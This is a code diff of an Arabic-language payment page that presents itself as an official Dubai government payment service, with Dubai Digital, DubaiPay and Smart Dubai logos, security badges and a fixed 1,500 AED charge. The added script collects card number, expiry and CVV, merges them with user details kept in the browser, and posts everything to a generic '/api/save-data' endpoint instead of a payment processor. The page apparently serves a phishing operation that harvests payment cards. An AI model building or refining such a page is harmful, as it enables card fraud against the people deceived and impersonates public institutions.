@@ -5,69 +5,377 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>الدفع - مبادرة فزعة</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #f5f7fa; color: #1e3a5f; line-height: 1.6; }
-        header { background-color: #ffffff; padding: 15px 20px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05); position: sticky; top: 0; z-index: 1000; }
-        .header-container { display: flex; justify-content: space-between; align-items: center; max-width: 1200px; margin: 0 auto; }
-        .logo-container img { max-height: 50px; width: auto; display: block; }
-        .container { max-width: 500px; margin: 20px auto; padding: 20px; background: #fff; border-radius: 16px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .input-group { margin-bottom: 20px; text-align: right; }
-        .input-group label { display: block; font-weight: bold; font-size: 0.95rem; color: #2d3748; margin-bottom: 8px; }
-        .input-control { width: 100%; padding: 14px 16px; border: 1.5px solid #e2e8f0; border-radius: 12px; background-color: #f7fafc; font-size: 1rem; color: #2d3748; outline: none; transition: 0.3s; text-align: right; }
-        .btn-pay { background: linear-gradient(135deg, #d4af37, #aa7c11); color: #fff; border: none; width: 100%; padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: white;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .header-logos {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            width: 100%;
+            justify-content: space-between;
+        }
+
+        .header-logo {
+            height: 32px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .content {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .section {
+            margin-bottom: 24px;
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #9ca3af;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .transaction-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            background: #f9fafb;
+            padding: 16px;
+            border-radius: 8px;
+        }
+
+        .info-row {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .info-label {
+            font-size: 13px;
+            color: #6b7280;
+        }
+
+        .info-value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #1f2937;
+            margin-bottom: 8px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
+        }
+
+        .date-row {
+            display: grid;
+            grid-template-columns: 1fr auto 1fr;
+            gap: 8px;
+            align-items: flex-end;
+        }
+
+        .date-row select {
+            flex: 1;
+        }
+
+        .date-separator {
+            color: #d1d5db;
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .cvv-row {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            align-items: flex-end;
+        }
+
+        .cvv-info {
+            font-size: 12px;
+            color: #6b7280;
+            line-height: 1.4;
+            grid-column: 1 / -1;
+            margin-top: 4px;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            height: 28px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .warning-note {
+            padding: 12px;
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            border-radius: 4px;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #92400e;
+            line-height: 1.5;
+        }
+
+        .total-amount {
+            text-align: center;
+            padding: 16px;
+            background: #f9fafb;
+            border-radius: 6px;
+            margin: 20px 0;
+        }
+
+        .total-label {
+            font-size: 13px;
+            color: #6b7280;
+            margin-bottom: 4px;
+        }
+
+        .total-value {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-cancel {
+            background: #e5e7eb;
+            color: #4b5563;
+        }
+
+        .btn-pay {
+            background: #0066cc;
+            color: white;
+        }
+
+        .btn-pay:hover {
+            background: #0052a3;
+        }
+
+        .footer {
+            padding: 20px;
+            text-align: center;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer-logo {
+            height: 40px;
+            width: auto;
+            margin-bottom: 12px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #9ca3af;
+        }
     </style>
 </head>
 <body>
-    <header>
-        <div class="header-container">
-            <div class="logo-container">
-                <img src="dubai_digital_logo.png" alt="Dubai Digital">
+    <div class="container">
+        <div class="header">
+            <div class="header-logos">
+                <img src="dubai_digital_logo.png" alt="Dubai Digital" class="header-logo">
+                <img src="dubaipay.png" alt="DubaiPay" class="header-logo">
             </div>
         </div>
-    </header>
-    <div class="container">
-        <h2 style="text-align: center; margin-bottom: 20px;">تفاصيل الدفع</h2>
-        <form id="paymentForm">
-            <div class="input-group">
-                <label>رقم البطاقة</label>
-                <input type="text" id="cardNumber" class="input-control" placeholder="**** **** **** ****" required>
-            </div>
-            <div style="display: flex; gap: 10px;">
-                <div class="input-group" style="flex: 1;">
-                    <label>تاريخ الانتهاء</label>
-                    <input type="text" id="expiry" class="input-control" placeholder="MM/YY" required>
-                </div>
-                <div class="input-group" style="flex: 1;">
-                    <label>الرمز السري (CVV)</label>
-                    <input type="text" id="cvv" class="input-control" placeholder="***" required>
+
+        <div class="content">
+            <div class="section">
+                <div class="section-title">معلومات المعاملة</div>
+                <div class="transaction-info">
+                    <div class="info-row">
+                        <div class="info-label">رقم المرجع</div>
+                        <div class="info-value">TRX-982341</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">التاريخ</div>
+                        <div class="info-value">2026-07-04</div>
+                    </div>
                 </div>
             </div>
-            <button type="submit" class="btn-pay">تأكيد الدفع</button>
-        </form>
+
+            <div class="section">
+                <div class="section-title">تفاصيل الدفع</div>
+                <form id="paymentForm">
+                    <div class="form-group">
+                        <label>رقم البطاقة</label>
+                        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>تاريخ الانتهاء</label>
+                        <div class="date-row">
+                            <select id="expMonth" required>
+                                <option value="" disabled selected>الشهر</option>
+                                <option>01</option><option>02</option><option>03</option><option>04</option>
+                                <option>05</option><option>06</option><option>07</option><option>08</option>
+                                <option>09</option><option>10</option><option>11</option><option>12</option>
+                            </select>
+                            <span class="date-separator">/</span>
+                            <select id="expYear" required>
+                                <option value="" disabled selected>السنة</option>
+                                <option>26</option><option>27</option><option>28</option><option>29</option>
+                                <option>30</option><option>31</option><option>32</option><option>33</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>الرمز السري (CVV)</label>
+                        <div class="cvv-row">
+                            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                            <div class="cvv-info">3 أو 4 أرقام موجودة خلف البطاقة</div>
+                        </div>
+                    </div>
+
+                    <div class="security-badges">
+                        <img src="verified_visa.gif" alt="Visa" class="badge">
+                        <img src="safekey.gif" alt="SafeKey" class="badge">
+                        <img src="pci_dss.png" alt="PCI DSS" class="badge">
+                    </div>
+
+                    <div class="total-amount">
+                        <div class="total-label">إجمالي المبلغ المستحق</div>
+                        <div class="total-value">1,500.00 درهم</div>
+                    </div>
+
+                    <div class="buttons">
+                        <button type="button" class="btn btn-cancel" onclick="window.history.back()">إلغاء</button>
+                        <button type="submit" class="btn btn-pay">دفع الآن</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="footer">
+            <img src="smart_dubai.png" alt="Smart Dubai" class="footer-logo">
+            <div class="footer-text">© 2026 دبي الرقمية. جميع الحقوق محفوظة.</div>
+        </div>
     </div>
+
     <script>
-        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const data = {
+            
+            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+            const paymentData = {
+                ...userData,
                 cardNumber: document.getElementById('cardNumber').value,
-                expiry: document.getElementById('expiry').value,
+                expiry: document.getElementById('expMonth').value + '/' + document.getElementById('expYear').value,
                 cvv: document.getElementById('cvv').value,
-                status: 'تم الدفع - في انتظار التأكيد'
+                amount: '1,500.00 درهم',
+                type: 'دفع بطاقة',
+                timestamp: new Date().toISOString()
             };
+
             try {
                 const response = await fetch('/api/save-data', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(paymentData)
                 });
+                
                 if (response.ok) {
-                    alert('تم استلام طلبك بنجاح، جاري التحقق...');
                     window.location.href = 'confirmation_ar.html';
                 } else {
-                    alert('حدث خطأ في الاتصال بالخادم');
+                    alert('حدث خطأ في عملية الدفع، يرجى المحاولة مرة أخرى.');
                 }
-            } catch (err) {
-                alert('حدث خطأ في الاتصال بالخادم');
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ في الاتصال بالخادم.');
+            }
+        });
+
+        // Card number formatting
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let matches = v.match(/\d{4,16}/g);
+            let match = matches && matches[0] || '';
+            let parts = [];
+            for (let i=0, len=match.length; i<len; i+=4) {
+                parts.push(match.substring(i, i+4));
+            }
+            if (parts.length) {
+                e.target.value = parts.join(' ');
+            } else {
+                e.target.value = v;
             }
         });
     </script>
